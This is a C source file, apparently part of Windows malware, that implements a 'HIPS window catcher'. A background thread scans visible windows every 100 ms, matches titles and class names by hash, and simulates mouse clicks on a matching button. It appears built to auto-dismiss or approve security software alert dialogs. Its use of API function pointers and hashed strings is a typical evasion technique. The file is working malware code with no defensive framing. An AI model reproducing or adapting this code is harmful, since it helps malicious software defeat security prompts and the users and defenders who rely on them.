typedef struct _hips_window_entry
{
    LIST_ENTRY;
    uint32_t nameHash;
    uint32_t classHash;
    uint32_t childNameHash;
    uint32_t childClassHash;
    uint32_t buttonNameHash;
    uint32_t buttonClassHash;
} hips_window_entry_t, *phips_window_entry_t;

//HANDLE ghWndEnumeratorThread;
phips_window_entry_t gpHeadHipsWindows = NULL;

#define WINDOW_WITHOUT_CHILD 0x00000001

BOOL CALLBACK hips_child_window_catcher(HWND hWnd, phips_window_entry_t pWindowEntry)
{
    wchar_t windowName[256], windowClass[256];
//     DWORD idThread, idProcess;
//     int code;

    if (hWnd == NULL || !fn_IsWindowVisible(hWnd)) {
        return TRUE; // Не валидное или невидимое окно - пропускаем.
    }

    if (pWindowEntry->childNameHash == 0 && pWindowEntry->childClassHash == 0) {
        // Нет дочернего окна, поэтому ищем сразу кнопку.
        fn_GetWindowTextW(hWnd, windowName, 256);
        fn_GetClassNameW(hWnd, windowClass, 256);

        if (utils_wcshash(windowName) == pWindowEntry->buttonNameHash && utils_wcshash(windowClass) == pWindowEntry->buttonClassHash) {
            RECT rect;
            fn_GetWindowRect(hWnd, &rect);
            fn_mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, rect.left, rect.top, 0, 0);
            fn_mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, rect.left, rect.top, 0, 0);

//             idThread = fn_GetWindowThreadProcessId(hWnd, &idProcess);
//             fn_AttachThreadInput(fn_GetCurrentThreadId(), idThread, 0);
// 
//             code = VK_RETURN;
//             fn_PostMessageA(hWnd, WM_KEYDOWN, code, (int)(fn_MapVirtualKeyA(code, 2) << 16) + 1);
//             fn_PostMessageA(hWnd, WM_KEYUP, code, (int)((3 << 30) | (fn_MapVirtualKeyA(code, 2) << 16) + 1));
        }
    }

// 
//     switch(lParam) {
//         case 0:
//             break;
//         case 1:
//             fn_GetClassNameW(hWnd, wszClassName, MAX_PATH);
// 
//             if (fn_lstrcmpiW(wszClassName, L"AtlAxWinLic80") == 0) {
//                 g_hFindWindowChild = hWnd;
//                 return FALSE;
//             }
//             return TRUE;
//         case 2:
//             fn_GetClassNameW(hWnd, wszClassName, MAX_PATH);
// 
//             if (fn_lstrcmpiW(wszClassName, L"Button") == 0) {
//                 g_iBtnCnt++;
//                 if (g_iBtnCnt == 2) {
//                     g_hFindWindowChild = hWnd;
//                     idThread = fn_GetWindowThreadProcessId(hWnd,&idProcess);
//                     fn_AttachThreadInput(fn_GetCurrentThreadId(),idThread,0);
// 
//                     code = VK_RETURN;
//                     fn_PostMessageA(hWnd, WM_KEYDOWN, code, (int)(fn_MapVirtualKeyA(code, 2) << 16) + 1);
//                     fn_PostMessageA(hWnd, WM_KEYUP, code, (int)((3 << 30) | (fn_MapVirtualKeyA(code, 2) << 16) + 1));
// 
//                     g_iBtnCnt = 0;
//                     return FALSE;
//                 }
// 
//             }
//             return TRUE;
//     }

    return TRUE;
}

BOOL CALLBACK hips_window_catcher(HWND hWnd, LPARAM lParam)
{
//    bool_t catched;
    wchar_t windowName[256], windowClassName[256];
    phips_window_entry_t pWindowEntry;

    if (hWnd == NULL || !fn_IsWindowVisible(hWnd)) { // Не валидное или невидимое окно - пропускаем.
        return TRUE;
    }

    pWindowEntry = (phips_window_entry_t)gpHeadHipsWindows->Flink;

    while (pWindowEntry != gpHeadHipsWindows) {
        fn_GetWindowTextW(hWnd, windowName, 256);
        fn_GetClassNameW(hWnd, windowClassName, 256);

        if (utils_wcshash(windowName) == pWindowEntry->nameHash && utils_wcshash(windowClassName) == pWindowEntry->classHash) {
            fn_EnumChildWindows(hWnd, (WNDENUMPROC)hips_child_window_catcher, (LPARAM)pWindowEntry);
        }

        pWindowEntry = (phips_window_entry_t)pWindowEntry->Flink;
    }

    return TRUE;
}

DWORD WINAPI hips_window_enumerator(LPVOID lpParam)
{
    for ( ; ; ) {
        fn_EnumWindows(hips_window_catcher, 0); 
        fn_SleepEx(100, FALSE);
    }
    return 0;
}

bool_t hips_add_window_name(uint32_t nameHash, uint32_t classHash, uint32_t childNameHash, uint32_t childClassHash, uint32_t buttonNameHash, uint32_t buttonClassHash)
{
    phips_window_entry_t pNewEntry;

    pNewEntry = fn_VirtualAlloc(NULL, sizeof(hips_window_entry_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pNewEntry == NULL) {
        return FALSE;
    }

    pNewEntry->nameHash = nameHash;
    pNewEntry->classHash = classHash;
    pNewEntry->childNameHash = childNameHash;
    pNewEntry->childClassHash = childClassHash;
    pNewEntry->buttonNameHash = buttonNameHash;
    pNewEntry->buttonClassHash = buttonClassHash;

    if (gpHeadHipsWindows == NULL) {
        gpHeadHipsWindows = fn_VirtualAlloc(NULL, sizeof(hips_window_entry_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        util_initialize_list_head((PLIST_ENTRY)gpHeadHipsWindows);
    }
    util_insert_tail_list((PLIST_ENTRY)gpHeadHipsWindows, (PLIST_ENTRY)pNewEntry);
    
    return TRUE;
}
